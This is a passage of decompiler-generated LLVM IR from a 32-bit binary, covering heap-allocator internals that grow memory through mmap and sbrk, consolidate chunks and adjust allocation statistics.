dec_label_pc_805f6e2:                             ; preds = %dec_label_pc_805f6ba, %dec_label_pc_805f6dc
  %v4_805f6e2 = or i32 %v1_805f796, 1
  %v0_805f6e7 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v4_805f6e2, i32* %ebx.global-to-local, align 4
  %v1_805f6ed = or i32 %v0_805f6e7, 1
  store i32 %v1_805f6ed, i32* %eax.global-to-local, align 4
  %v1_805f6f0 = load i32, i32* @ecx, align 4
  %v2_805f6f0 = add i32 %v1_805f6f0, 4
  %v3_805f6f0 = inttoptr i32 %v2_805f6f0 to i32*
  store i32 %v4_805f6e2, i32* %v3_805f6f0, align 4
  %v0_805f6f3 = load i32, i32* %esi.global-to-local, align 4
  %v1_805f6f3 = load i32, i32* %edx.global-to-local, align 4
  %v3_805f6f3 = add i32 %v1_805f6f3, %v0_805f6f3
  %v4_805f6f3 = inttoptr i32 %v3_805f6f3 to i32*
  store i32 %v0_805f6f3, i32* %v4_805f6f3, align 4
  %v0_805f6f6 = load i32, i32* %eax.global-to-local, align 4
  %v1_805f6f6 = load i32, i32* %edx.global-to-local, align 4
  %v2_805f6f6 = add i32 %v1_805f6f6, 4
  %v3_805f6f6 = inttoptr i32 %v2_805f6f6 to i32*
  store i32 %v0_805f6f6, i32* %v3_805f6f6, align 4
  br label %dec_label_pc_805f6f9

dec_label_pc_805f6f9:                             ; preds = %dec_label_pc_805f6b3, %dec_label_pc_805f6e2
  %v0_805f6f9 = load i32, i32* @ecx, align 4
  %v1_805f6f9 = add i32 %v0_805f6f9, 8
  store i32 %v1_805f6f9, i32* @ebx, align 4
  br label %dec_label_pc_805fafb

dec_label_pc_805f701.loopexit:                    ; preds = %dec_label_pc_805f64e
  br label %dec_label_pc_805f701

dec_label_pc_805f701:                             ; preds = %dec_label_pc_805f701.loopexit, %dec_label_pc_805f409, %dec_label_pc_805f411
  %v0_805f701 = load i32, i32* @global_var_807e64c.733, align 4
  store i32 %v0_805f701, i32* @ebx, align 4
  %v1_805f70b = add i32 %v1_805f796, 16
  store i32 %v1_805f70b, i32* @esi, align 4
  %v1_805f70e = add i32 %v0_805f701, 4
  %v2_805f70e = inttoptr i32 %v1_805f70e to i32*
  %v3_805f70e = load i32, i32* %v2_805f70e, align 4
  %v1_805f715 = and i32 %v3_805f70e, -4
  store i32 %v1_805f715, i32* %ecx.global-to-local, align 4
  %v7_805f718 = icmp ult i32 %v1_805f715, %v1_805f70b
  br i1 %v7_805f718, label %dec_label_pc_805f738, label %dec_label_pc_805f71c

dec_label_pc_805f71c:                             ; preds = %dec_label_pc_805f701
  %v2_805f720 = add i32 %v0_805f701, %v1_805f796
  store i32 %v2_805f720, i32* %edx.global-to-local, align 4
  %v1_805f723 = or i32 %v1_805f796, 1
  store i32 %v1_805f723, i32* %eax.global-to-local, align 4
  store i32 %v2_805f720, i32* @global_var_807e64c.733, align 4
  store i32 %v1_805f723, i32* %v2_805f70e, align 4
  %v0_805f72f = load i32, i32* %ecx.global-to-local, align 4
  %v5_805f72f = sub i32 %v0_805f72f, %v1_805f796
  store i32 %v5_805f72f, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_805fa8b

dec_label_pc_805f738:                             ; preds = %dec_label_pc_805f701
  %v0_805f738 = load i32, i32* @global_var_807e97c.738, align 4
  store i32 %v0_805f738, i32* %edx.global-to-local, align 4
  %v0_805f73e = load i8, i8* @global_var_807e620.732, align 32
  %v1_805f73e = and i8 %v0_805f73e, 2
  %v2_805f73e = icmp eq i8 %v1_805f73e, 0
  br i1 %v2_805f73e, label %dec_label_pc_805f76c, label %dec_label_pc_805f747

dec_label_pc_805f747:                             ; preds = %dec_label_pc_805f738
  store i32 ptrtoint (i8* @global_var_807e620.732 to i32), i32* %stack_var_-92, align 4
  %v2_805f74f = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_807e620.732 to i32*))
  store i32 ptrtoint (i8* @global_var_807e620.732 to i32), i32* @ebx, align 4
  %v1_805f759 = add i32 %v1_805f796, -7
  store i32 %v1_805f759, i32* %eax.global-to-local, align 4
  store i32 %v1_805f759, i32* %stack_var_-92, align 4
  %v1_805f75d = call i32 @malloc(i32 %v1_805f759)
  store i32 %v1_805f75d, i32* %eax.global-to-local, align 4
  store i32 %v1_805f75d, i32* @ebx, align 4
  br label %dec_label_pc_805fafb

dec_label_pc_805f76c:                             ; preds = %dec_label_pc_805f738
  %v1_805f76c = add i32 %v0_805f738, -1
  store i32 %v1_805f76c, i32* @ecx, align 4
  store i32 %v1_805f796, i32* @ebx, align 4
  %v1_805f777 = load i32, i32* @global_var_807e96c.739, align 4
  %v7_805f777 = icmp ult i32 %v1_805f796, %v1_805f777
  br i1 %v7_805f777, label %dec_label_pc_805f839, label %dec_label_pc_805f783

dec_label_pc_805f783:                             ; preds = %dec_label_pc_805f76c
  %v0_805f783 = load i32, i32* @global_var_807e970.740, align 16
  store i32 %v0_805f783, i32* %eax.global-to-local, align 4
  %v1_805f788 = load i32, i32* @global_var_807e974.741, align 4
  %v5_805f78e = icmp slt i32 %v0_805f783, %v1_805f788
  br i1 %v5_805f78e, label %dec_label_pc_805f794, label %dec_label_pc_805f839

dec_label_pc_805f794:                             ; preds = %dec_label_pc_805f783
  %v2_805f796 = add i32 %v1_805f796, 10
  %v3_805f796 = add i32 %v2_805f796, %v0_805f738
  %v1_805f79a = sub i32 0, %v0_805f738
  store i32 %v1_805f79a, i32* %eax.global-to-local, align 4
  %v2_805f79c = and i32 %v3_805f796, %v1_805f79a
  store i32 %v2_805f79c, i32* @ebx, align 4
  %tmp134 = icmp ugt i32 %v2_805f79c, %v1_805f796
  br i1 %tmp134, label %dec_label_pc_805f7a8, label %dec_label_pc_805f839

dec_label_pc_805f7a8:                             ; preds = %dec_label_pc_805f794
  store i32 0, i32* %stack_var_-92, align 4
  %v8_805f7b5 = call i32 @mmap(i32 0, i32 %v2_805f79c, i32 3, i32 34, i32 0, i32 0, i32 %v1_805f76c, i32 %v1_805f76c)
  store i32 %v8_805f7b5, i32* %eax.global-to-local, align 4
  store i32 %v8_805f7b5, i32* %edx.global-to-local, align 4
  %v10_805f7bf = icmp eq i32 %v8_805f7b5, -1
  br i1 %v10_805f7bf, label %dec_label_pc_805f7a8.dec_label_pc_805f839_crit_edge, label %dec_label_pc_805f7c4

dec_label_pc_805f7a8.dec_label_pc_805f839_crit_edge: ; preds = %dec_label_pc_805f7a8
  %v0_805f839.pre = load i32, i32* @global_var_807e64c.733, align 4
  br label %dec_label_pc_805f839

dec_label_pc_805f7c4:                             ; preds = %dec_label_pc_805f7a8
  %v1_805f7c6 = urem i32 %v8_805f7b5, 8
  %v2_805f7c6 = icmp eq i32 %v1_805f7c6, 0
  store i32 %v1_805f7c6, i32* @ecx, align 4
  br i1 %v2_805f7c6, label %dec_label_pc_805f7de, label %dec_label_pc_805f7cb

dec_label_pc_805f7cb:                             ; preds = %dec_label_pc_805f7c4
  %v0_805f7d0 = load i32, i32* @ebx, align 4
  %v2_805f7d2 = sub nsw i32 8, %v1_805f7c6
  store i32 %v2_805f7d2, i32* %eax.global-to-local, align 4
  %v2_805f7d4 = add i32 %v2_805f7d2, %v8_805f7b5
  store i32 %v2_805f7d4, i32* %edx.global-to-local, align 4
  %v2_805f7d6 = sub i32 %v0_805f7d0, %v2_805f7d2
  store i32 %v2_805f7d6, i32* %esi.global-to-local, align 4
  %v2_805f7d8 = inttoptr i32 %v2_805f7d4 to i32*
  store i32 %v2_805f7d2, i32* %v2_805f7d8, align 4
  br label %dec_label_pc_805f7e6

dec_label_pc_805f7de:                             ; preds = %dec_label_pc_805f7c4
  %v1_805f7de = inttoptr i32 %v8_805f7b5 to i32*
  store i32 0, i32* %v1_805f7de, align 4
  br label %dec_label_pc_805f7e6

dec_label_pc_805f7e6:                             ; preds = %dec_label_pc_805f7cb, %dec_label_pc_805f7de
  %storemerge.in = phi i32* [ @esi, %dec_label_pc_805f7cb ], [ @ebx, %dec_label_pc_805f7de ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v1_805f7e6 = or i32 %storemerge, 2
  %v1_805f7e9 = load i32, i32* %edx.global-to-local, align 4
  %v2_805f7e9 = add i32 %v1_805f7e9, 4
  %v3_805f7e9 = inttoptr i32 %v2_805f7e9 to i32*
  store i32 %v1_805f7e6, i32* %v3_805f7e9, align 4
  %v0_805f7ec = load i32, i32* @global_var_807e970.740, align 16
  %v1_805f7f1 = add i32 %v0_805f7ec, 1
  store i32 %v1_805f7f1, i32* %eax.global-to-local, align 4
  store i32 %v1_805f7f1, i32* @global_var_807e970.740, align 16
  %v1_805f7f7 = load i32, i32* @global_var_807e978.742, align 8
  %v7_805f7fd = icmp sgt i32 %v1_805f7f1, %v1_805f7f7
  br i1 %v7_805f7fd, label %dec_label_pc_805f7ff, label %dec_label_pc_805f804

dec_label_pc_805f7ff:                             ; preds = %dec_label_pc_805f7e6
  store i32 %v1_805f7f1, i32* @global_var_807e978.742, align 8
  br label %dec_label_pc_805f804

dec_label_pc_805f804:                             ; preds = %dec_label_pc_805f7e6, %dec_label_pc_805f7ff
  %v0_805f804 = load i32, i32* @global_var_807e984.743, align 4
  %v1_805f809 = load i32, i32* @ebx, align 4
  %v2_805f809 = add i32 %v1_805f809, %v0_805f804
  store i32 %v2_805f809, i32* %eax.global-to-local, align 4
  store i32 %v2_805f809, i32* @global_var_807e984.743, align 4
  %v1_805f810 = load i32, i32* @global_var_807e990.744, align 16
  %tmp135 = icmp ugt i32 %v2_805f809, %v1_805f810
  br i1 %tmp135, label %dec_label_pc_805f818, label %dec_label_pc_805f81d

dec_label_pc_805f818:                             ; preds = %dec_label_pc_805f804
  store i32 %v2_805f809, i32* @global_var_807e990.744, align 16
  br label %dec_label_pc_805f81d

dec_label_pc_805f81d:                             ; preds = %dec_label_pc_805f804, %dec_label_pc_805f818
  %v1_805f81d = load i32, i32* @global_var_807e988.745, align 8
  %v2_805f81d = add i32 %v1_805f81d, %v2_805f809
  store i32 %v2_805f81d, i32* %eax.global-to-local, align 4
  %v1_805f823 = load i32, i32* @global_var_807e994.746, align 4
  %tmp136 = icmp ugt i32 %v2_805f81d, %v1_805f823
  br i1 %tmp136, label %dec_label_pc_805f82f, label %dec_label_pc_805f480

dec_label_pc_805f82f:                             ; preds = %dec_label_pc_805f81d
  store i32 %v2_805f81d, i32* @global_var_807e994.746, align 4
  br label %dec_label_pc_805f480

dec_label_pc_805f839:                             ; preds = %dec_label_pc_805f794, %dec_label_pc_805f7a8.dec_label_pc_805f839_crit_edge, %dec_label_pc_805f783, %dec_label_pc_805f76c
  %v0_805f839 = phi i32 [ %v0_805f839.pre, %dec_label_pc_805f7a8.dec_label_pc_805f839_crit_edge ], [ %v0_805f701, %dec_label_pc_805f783 ], [ %v0_805f701, %dec_label_pc_805f794 ], [ %v0_805f701, %dec_label_pc_805f76c ]
  store i32 %v0_805f839, i32* %eax.global-to-local, align 4
  %v1_805f842 = add i32 %v0_805f839, 4
  %v2_805f842 = inttoptr i32 %v1_805f842 to i32*
  %v3_805f842 = load i32, i32* %v2_805f842, align 4
  %v1_805f84c = and i32 %v3_805f842, -4
  %v2_805f84c = icmp eq i32 %v1_805f84c, 0
  store i32 %v1_805f84c, i32* @ebp, align 4
  %v1_805f84f = load i32, i32* @global_var_807e968.747, align 8
  %v2_805f84f = add i32 %v1_805f84f, %v1_805f70b
  store i32 %v2_805f84f, i32* %eax.global-to-local, align 4
  %v0_805f855 = load i8, i8* @global_var_807e980.748, align 128
  %v1_805f855 = urem i8 %v0_805f855, 2
  %v2_805f855 = icmp eq i8 %v1_805f855, 0
  br i1 %v2_805f855, label %dec_label_pc_805f860, label %dec_label_pc_805f85e

dec_label_pc_805f85e:                             ; preds = %dec_label_pc_805f839
  %v2_805f85e = sub i32 %v2_805f84f, %v1_805f84c
  store i32 %v2_805f85e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805f860

dec_label_pc_805f860:                             ; preds = %dec_label_pc_805f839, %dec_label_pc_805f85e
  %v0_805f864 = phi i32 [ %v2_805f84f, %dec_label_pc_805f839 ], [ %v2_805f85e, %dec_label_pc_805f85e ]
  %v5_805f864 = add i32 %v0_805f864, %v1_805f76c
  store i32 %v5_805f864, i32* %eax.global-to-local, align 4
  %v1_805f868 = sub i32 0, %v0_805f738
  store i32 %v1_805f868, i32* %edx.global-to-local, align 4
  %v2_805f870 = and i32 %v5_805f864, %v1_805f868
  store i32 %v2_805f870, i32* @esi, align 4
  %tmp88 = icmp slt i32 %v2_805f870, 1
  br i1 %tmp88, label %dec_label_pc_805f88a, label %dec_label_pc_805f874

dec_label_pc_805f874:                             ; preds = %dec_label_pc_805f860
  store i32 %v2_805f870, i32* %stack_var_-92, align 4
  %v1_805f878 = call i32 @__GI_sbrk(i32 %v2_805f870)
  store i32 %v1_805f878, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %edx.global-to-local, align 4
  store i32 %v1_805f878, i32* @ebx, align 4
  %v10_805f885 = icmp eq i32 %v1_805f878, -1
  %v1_805f888 = icmp eq i1 %v10_805f885, false
  br i1 %v1_805f888, label %dec_label_pc_805f8e0, label %dec_label_pc_805f874.dec_label_pc_805f88a_crit_edge

dec_label_pc_805f874.dec_label_pc_805f88a_crit_edge: ; preds = %dec_label_pc_805f874
  %v0_805f88a.pre = load i8, i8* @global_var_807e980.748, align 128
  br label %dec_label_pc_805f88a

dec_label_pc_805f88a:                             ; preds = %dec_label_pc_805f874.dec_label_pc_805f88a_crit_edge, %dec_label_pc_805f860
  %v0_805f8b6 = phi i32 [ -1, %dec_label_pc_805f874.dec_label_pc_805f88a_crit_edge ], [ %v1_805f868, %dec_label_pc_805f860 ]
  %v0_805f88a = phi i8 [ %v0_805f88a.pre, %dec_label_pc_805f874.dec_label_pc_805f88a_crit_edge ], [ %v0_805f855, %dec_label_pc_805f860 ]
  %v1_805f88a = urem i8 %v0_805f88a, 2
  %v2_805f88a = icmp eq i8 %v1_805f88a, 0
  br i1 %v2_805f88a, label %dec_label_pc_805f88a.dec_label_pc_805f89f_crit_edge, label %dec_label_pc_805f893

dec_label_pc_805f88a.dec_label_pc_805f89f_crit_edge: ; preds = %dec_label_pc_805f88a
  %v0_805f89f.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805f89f

dec_label_pc_805f893:                             ; preds = %dec_label_pc_805f88a
  %v2_805f897 = add i32 %v1_805f84c, %v1_805f76c
  store i32 %v2_805f897, i32* %eax.global-to-local, align 4
  %v0_805f899 = load i32, i32* @esi, align 4
  %v2_805f899 = add i32 %v0_805f899, %v2_805f897
  %v5_805f89b = and i32 %v2_805f899, %v1_805f868
  store i32 %v5_805f89b, i32* @esi, align 4
  br label %dec_label_pc_805f89f

dec_label_pc_805f89f:                             ; preds = %dec_label_pc_805f88a.dec_label_pc_805f89f_crit_edge, %dec_label_pc_805f893
  %v0_805f89f = phi i32 [ %v0_805f89f.pre, %dec_label_pc_805f88a.dec_label_pc_805f89f_crit_edge ], [ %v5_805f89b, %dec_label_pc_805f893 ]
  %tmp130 = icmp ult i32 %v0_805f89f, 1048576
  br i1 %tmp130, label %dec_label_pc_805f8a7, label %dec_label_pc_805f8ac

dec_label_pc_805f8a7:                             ; preds = %dec_label_pc_805f89f
  store i32 1048576, i32* @esi, align 4
  br label %dec_label_pc_805f8ac

dec_label_pc_805f8ac:                             ; preds = %dec_label_pc_805f89f, %dec_label_pc_805f8a7
  %v0_805f8c0 = phi i32 [ %v0_805f89f, %dec_label_pc_805f89f ], [ 1048576, %dec_label_pc_805f8a7 ]
  %tmp137 = icmp ugt i32 %v0_805f8c0, %v1_805f796
  br i1 %tmp137, label %dec_label_pc_805f8b6, label %dec_label_pc_805faee

dec_label_pc_805f8b6:                             ; preds = %dec_label_pc_805f8ac
  store i32 0, i32* %stack_var_-92, align 4
  %v8_805f8c3 = call i32 @mmap(i32 0, i32 %v0_805f8c0, i32 3, i32 34, i32 0, i32 0, i32 %v0_805f8b6, i32 %v0_805f8b6)
  store i32 %v8_805f8c3, i32* %eax.global-to-local, align 4
  store i32 %v8_805f8c3, i32* @ebx, align 4
  %v10_805f8cd = icmp eq i32 %v8_805f8c3, -1
  br i1 %v10_805f8cd, label %dec_label_pc_805faee, label %dec_label_pc_805f8d6

dec_label_pc_805f8d6:                             ; preds = %dec_label_pc_805f8b6
  %v0_805f8d6 = load i8, i8* @global_var_807e980.748, align 1
  %v2_805f8d6 = and i8 %v0_805f8d6, -2
  store i8 %v2_805f8d6, i8* @global_var_807e980.748, align 128
  %v1_805f8dd = load i32, i32* @esi, align 4
  %v2_805f8dd = add i32 %v1_805f8dd, %v8_805f8c3
  store i32 %v2_805f8dd, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805f8e0

dec_label_pc_805f8e0:                             ; preds = %dec_label_pc_805f874, %dec_label_pc_805f8d6
  %v0_805f9a7 = phi i32 [ -1, %dec_label_pc_805f874 ], [ %v2_805f8dd, %dec_label_pc_805f8d6 ]
  %v0_805f9b5 = phi i32 [ %v1_805f878, %dec_label_pc_805f874 ], [ %v8_805f8c3, %dec_label_pc_805f8d6 ]
  %v10_805f8e0 = icmp eq i32 %v0_805f9b5, -1
  br i1 %v10_805f8e0, label %dec_label_pc_805faee, label %dec_label_pc_805f8e9

dec_label_pc_805f8e9:                             ; preds = %dec_label_pc_805f8e0
  %v0_805f8ed = load i32, i32* @global_var_807e988.745, align 8
  %v1_805f8ed = load i32, i32* @esi, align 4
  %v2_805f8ed = add i32 %v1_805f8ed, %v0_805f8ed
  store i32 %v2_805f8ed, i32* @global_var_807e988.745, align 8
  %v2_805f8f3 = add i32 %v1_805f84c, %v0_805f839
  store i32 %v2_805f8f3, i32* %ecx.global-to-local, align 4
  %v2_805f8f5 = sub i32 %v0_805f9b5, %v2_805f8f3
  %v7_805f8f5 = icmp ult i32 %v0_805f9b5, %v2_805f8f3
  %v12_805f8f5 = icmp eq i32 %v2_805f8f5, 0
  %v1_805f8f7 = icmp eq i1 %v12_805f8f5, false
  br i1 %v1_805f8f7, label %dec_label_pc_805f910, label %dec_label_pc_805f8f9

dec_label_pc_805f8f9:                             ; preds = %dec_label_pc_805f8e9
  %v10_805f8f9 = icmp eq i32 %v0_805f9a7, -1
  %v1_805f8fc = icmp eq i1 %v10_805f8f9, false
  br i1 %v1_805f8fc, label %dec_label_pc_805f910, label %dec_label_pc_805f8fe

dec_label_pc_805f8fe:                             ; preds = %dec_label_pc_805f8f9
  %v2_805f8fe = add i32 %v1_805f8ed, %v1_805f84c
  store i32 %v0_805f839, i32* %ecx.global-to-local, align 4
  %v1_805f905 = or i32 %v2_805f8fe, 1
  store i32 %v1_805f905, i32* %eax.global-to-local, align 4
  store i32 %v1_805f905, i32* %v2_805f842, align 4
  br label %dec_label_pc_805fa3d

dec_label_pc_805f910:                             ; preds = %dec_label_pc_805f8f9, %dec_label_pc_805f8e9
  %v0_805f910 = load i8, i8* @global_var_807e980.748, align 1
  %v1_805f910 = sext i8 %v0_805f910 to i32
  store i32 %v1_805f910, i32* %eax.global-to-local, align 4
  %v2_805f915 = urem i8 %v0_805f910, 2
  %v3_805f915 = icmp eq i8 %v2_805f915, 0
  br i1 %v3_805f915, label %dec_label_pc_805f929, label %dec_label_pc_805f919

dec_label_pc_805f919:                             ; preds = %dec_label_pc_805f910
  br i1 %v2_805f84c, label %dec_label_pc_805f929, label %dec_label_pc_805f91d

dec_label_pc_805f91d:                             ; preds = %dec_label_pc_805f919
  %v1_805f91f = icmp eq i1 %v7_805f8f5, false
  br i1 %v1_805f91f, label %dec_label_pc_805f929, label %dec_label_pc_805f921

dec_label_pc_805f921:                             ; preds = %dec_label_pc_805f91d
  %v1_805f921 = and i32 %v1_805f910, -2
  %v4_805f921 = trunc i32 %v1_805f921 to i8
  store i32 %v1_805f921, i32* %eax.global-to-local, align 4
  store i8 %v4_805f921, i8* @global_var_807e980.748, align 128
  br label %dec_label_pc_805f929

dec_label_pc_805f929:                             ; preds = %dec_label_pc_805f91d, %dec_label_pc_805f919, %dec_label_pc_805f910, %dec_label_pc_805f921
  %v0_805f929 = phi i8 [ %v0_805f910, %dec_label_pc_805f91d ], [ %v0_805f910, %dec_label_pc_805f919 ], [ %v0_805f910, %dec_label_pc_805f910 ], [ %v4_805f921, %dec_label_pc_805f921 ]
  %v1_805f929 = urem i8 %v0_805f929, 2
  %v2_805f929 = icmp eq i8 %v1_805f929, 0
  br i1 %v2_805f929, label %dec_label_pc_805f9a7, label %dec_label_pc_805f932

dec_label_pc_805f932:                             ; preds = %dec_label_pc_805f929
  br i1 %v2_805f84c, label %dec_label_pc_805f940, label %dec_label_pc_805f936

dec_label_pc_805f936:                             ; preds = %dec_label_pc_805f932
  store i32 %v2_805f8f5, i32* %eax.global-to-local, align 4
  %v2_805f93a = add i32 %v2_805f8ed, %v2_805f8f5
  store i32 %v2_805f93a, i32* @global_var_807e988.745, align 8
  br label %dec_label_pc_805f940

dec_label_pc_805f940:                             ; preds = %dec_label_pc_805f932, %dec_label_pc_805f936
  %v1_805f942 = urem i32 %v0_805f9b5, 8
  %v2_805f942 = icmp eq i32 %v1_805f942, 0
  store i32 %v1_805f942, i32* %edx.global-to-local, align 4
  %v1_805f945 = icmp eq i1 %v2_805f942, false
  br i1 %v1_805f945, label %dec_label_pc_805f94d, label %dec_label_pc_805f947

dec_label_pc_805f947:                             ; preds = %dec_label_pc_805f940
  store i32 %v0_805f9b5, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805f957

dec_label_pc_805f94d:                             ; preds = %dec_label_pc_805f940
  %v2_805f952 = sub nsw i32 8, %v1_805f942
  store i32 %v2_805f952, i32* %eax.global-to-local, align 4
  %v2_805f954 = add i32 %v2_805f952, %v0_805f9b5
  store i32 %v2_805f954, i32* @edi, align 4
  br label %dec_label_pc_805f957

dec_label_pc_805f957:                             ; preds = %dec_label_pc_805f947, %dec_label_pc_805f94d
  %v0_805f95a = phi i32 [ 0, %dec_label_pc_805f947 ], [ %v2_805f952, %dec_label_pc_805f94d ]
  %v2_805f957 = add i32 %v1_805f8ed, %v0_805f9b5
  %v2_805f95a = add i32 %v0_805f95a, %v1_805f84c
  store i32 %v2_805f95a, i32* %ecx.global-to-local, align 4
  %v2_805f963 = add i32 %v2_805f95a, %v2_805f957
  store i32 %v2_805f963, i32* %edx.global-to-local, align 4
  %v2_805f969 = add i32 %v2_805f963, %v1_805f76c
  %v5_805f96c = and i32 %v2_805f969, %v1_805f868
  %v2_805f973 = sub i32 %v5_805f96c, %v2_805f963
  store i32 %v2_805f973, i32* %eax.global-to-local, align 4
  %v2_805f975 = add i32 %v2_805f973, %v2_805f95a
  store i32 %v2_805f975, i32* @esi, align 4
  store i32 %v2_805f975, i32* %stack_var_-92, align 4
  %v1_805f979 = call i32 @__GI_sbrk(i32 %v2_805f975)
  store i32 %v1_805f979, i32* %eax.global-to-local, align 4
  store i32 %v1_805f979, i32* %edx.global-to-local, align 4
  %v10_805f983 = icmp eq i32 %v1_805f979, -1
  %v1_805f986 = icmp eq i1 %v10_805f983, false
  br i1 %v1_805f986, label %dec_label_pc_805f996, label %dec_label_pc_805f988

dec_label_pc_805f988:                             ; preds = %dec_label_pc_805f957
  store i32 0, i32* %stack_var_-92, align 4
  %v1_805f98d = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_805f98d, i32* %eax.global-to-local, align 4
  store i32 %v1_805f98d, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805f9ca

dec_label_pc_805f996:                             ; preds = %dec_label_pc_805f957
  %v1_805f996 = load i32, i32* @ebx, align 4
  %v7_805f996 = icmp ult i32 %v1_805f979, %v1_805f996
  %v1_805f998 = icmp eq i1 %v7_805f996, false
  br i1 %v1_805f998, label %dec_label_pc_805f9cf, label %dec_label_pc_805f99a

dec_label_pc_805f99a:                             ; preds = %dec_label_pc_805f996
  %v0_805f99a = load i8, i8* @global_var_807e980.748, align 1
  %v2_805f99a = and i8 %v0_805f99a, -2
  store i8 %v2_805f99a, i8* @global_var_807e980.748, align 128
  store i32 %v2_805f957, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805f9ae

dec_label_pc_805f9a7:                             ; preds = %dec_label_pc_805f929
  %v10_805f9a7 = icmp eq i32 %v0_805f9a7, -1
  br i1 %v10_805f9a7, label %dec_label_pc_805f9b2, label %dec_label_pc_805f9ac

dec_label_pc_805f9ac:                             ; preds = %dec_label_pc_805f9a7
  store i32 %v0_805f9b5, i32* @edi, align 4
  br label %dec_label_pc_805f9ae

dec_label_pc_805f9ae:                             ; preds = %dec_label_pc_805f99a, %dec_label_pc_805f9ac
  %v0_805f9cf49 = phi i32 [ %v2_805f957, %dec_label_pc_805f99a ], [ %v0_805f9a7, %dec_label_pc_805f9ac ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_805f9cf

dec_label_pc_805f9b2:                             ; preds = %dec_label_pc_805f9a7
  store i32 %v0_805f9b5, i32* @edi, align 4
  store i32 0, i32* %stack_var_-92, align 4
  %v1_805f9b9 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_805f9b9, i32* %edx.global-to-local, align 4
  %v1_805f9c0 = load i32, i32* @ebx, align 4
  %v2_805f9c0 = sub i32 %v1_805f9b9, %v1_805f9c0
  %v1_805f9c2 = load i32, i32* @esi, align 4
  %v2_805f9c2 = sub i32 %v2_805f9c0, %v1_805f9c2
  store i32 %v2_805f9c2, i32* %eax.global-to-local, align 4
  %v0_805f9c4 = load i32, i32* @global_var_807e988.745, align 8
  %v2_805f9c4 = add i32 %v0_805f9c4, %v2_805f9c2
  store i32 %v2_805f9c4, i32* @global_var_807e988.745, align 8
  br label %dec_label_pc_805f9ca

dec_label_pc_805f9ca:                             ; preds = %dec_label_pc_805f988, %dec_label_pc_805f9b2
  %v0_805f9cf48 = phi i32 [ %v1_805f98d, %dec_label_pc_805f988 ], [ %v1_805f9b9, %dec_label_pc_805f9b2 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_805f9cf

dec_label_pc_805f9cf:                             ; preds = %dec_label_pc_805f996, %dec_label_pc_805f9ae, %dec_label_pc_805f9ca
  %v0_805f9d4 = phi i32 [ %v1_805f979, %dec_label_pc_805f996 ], [ %v0_805f9cf49, %dec_label_pc_805f9ae ], [ %v0_805f9cf48, %dec_label_pc_805f9ca ]
  %v10_805f9cf = icmp eq i32 %v0_805f9d4, -1
  br i1 %v10_805f9cf, label %dec_label_pc_805fa3d, label %dec_label_pc_805f9d4

dec_label_pc_805f9d4:                             ; preds = %dec_label_pc_805f9cf
  %v1_805f9d4 = load i32, i32* @edi, align 4
  %v2_805f9d4 = sub i32 %v0_805f9d4, %v1_805f9d4
  store i32 %v2_805f9d4, i32* %edx.global-to-local, align 4
  store i32 %v1_805f9d4, i32* @global_var_807e64c.733, align 4
  %v1_805f9dc = load i32, i32* @esi, align 4
  %v2_805f9dc = add i32 %v1_805f9dc, %v2_805f9d4
  %v1_805f9df = or i32 %v2_805f9dc, 1
  store i32 %v1_805f9df, i32* %eax.global-to-local, align 4
  %v2_805f9e2 = add i32 %v1_805f9d4, 4
  %v3_805f9e2 = inttoptr i32 %v2_805f9e2 to i32*
  store i32 %v1_805f9df, i32* %v3_805f9e2, align 4
  %v0_805f9e5 = load i32, i32* @global_var_807e988.745, align 8
  %v1_805f9e5 = load i32, i32* @esi, align 4
  %v2_805f9e5 = add i32 %v1_805f9e5, %v0_805f9e5
  store i32 %v2_805f9e5, i32* @global_var_807e988.745, align 8
  br i1 %v2_805f84c, label %dec_label_pc_805fa3d, label %dec_label_pc_805f9ef

dec_label_pc_805f9ef:                             ; preds = %dec_label_pc_805f9d4
  %v1_805f9ef = add i32 %v1_805f84c, -12
  store i32 %v0_805f839, i32* @ecx, align 4
  %v1_805f9f6 = and i32 %v1_805f9ef, -8
  store i32 %v1_805f9f6, i32* %eax.global-to-local, align 4
  %v1_805f9fb = or i32 %v1_805f9f6, 1
  store i32 %v1_805f9fb, i32* %edx.global-to-local, align 4
  %v5_805f9fe = icmp ult i32 %v1_805f9f6, 15
  store i32 %v1_805f9fb, i32* %v2_805f842, align 4
  %v0_805fa04 = load i32, i32* @ecx, align 4
  %v1_805fa04 = load i32, i32* %eax.global-to-local, align 4
  %v2_805fa04 = add i32 %v0_805fa04, 4
  %v3_805fa04 = add i32 %v2_805fa04, %v1_805fa04
  %v4_805fa04 = inttoptr i32 %v3_805fa04 to i32*
  store i32 5, i32* %v4_805fa04, align 4
  %v0_805fa0c = load i32, i32* @ecx, align 4
  %v1_805fa0c = load i32, i32* %eax.global-to-local, align 4
  %v2_805fa0c = add i32 %v0_805fa0c, 8
  %v3_805fa0c = add i32 %v2_805fa0c, %v1_805fa0c
  %v4_805fa0c = inttoptr i32 %v3_805fa0c to i32*
  store i32 5, i32* %v4_805fa0c, align 4
  br i1 %v5_805f9fe, label %dec_label_pc_805fa3d, label %dec_label_pc_805fa16

dec_label_pc_805fa16:                             ; preds = %dec_label_pc_805f9ef
  %v0_805fa19 = load i32, i32* @ecx, align 4
  %v1_805fa1b = add i32 %v0_805fa19, 8
  store i32 %v1_805fa1b, i32* %eax.global-to-local, align 4
  %v0_805fa1e = load i32, i32* @global_var_807e964.749, align 4
  store i32 %v0_805fa1e, i32* @ebx, align 4
  store i32 %v1_805fa1b, i32* %stack_var_-92, align 4
  store i32 -1, i32* @global_var_807e964.749, align 4
  %v1_805fa2f = call i32 @free(i32 %v1_805fa1b)
  store i32 %v1_805fa2f, i32* %eax.global-to-local, align 4
  %v0_805fa34 = load i32, i32* @ebx, align 4
  store i32 %v0_805fa34, i32* @global_var_807e964.749, align 4
  br label %dec_label_pc_805fa3d

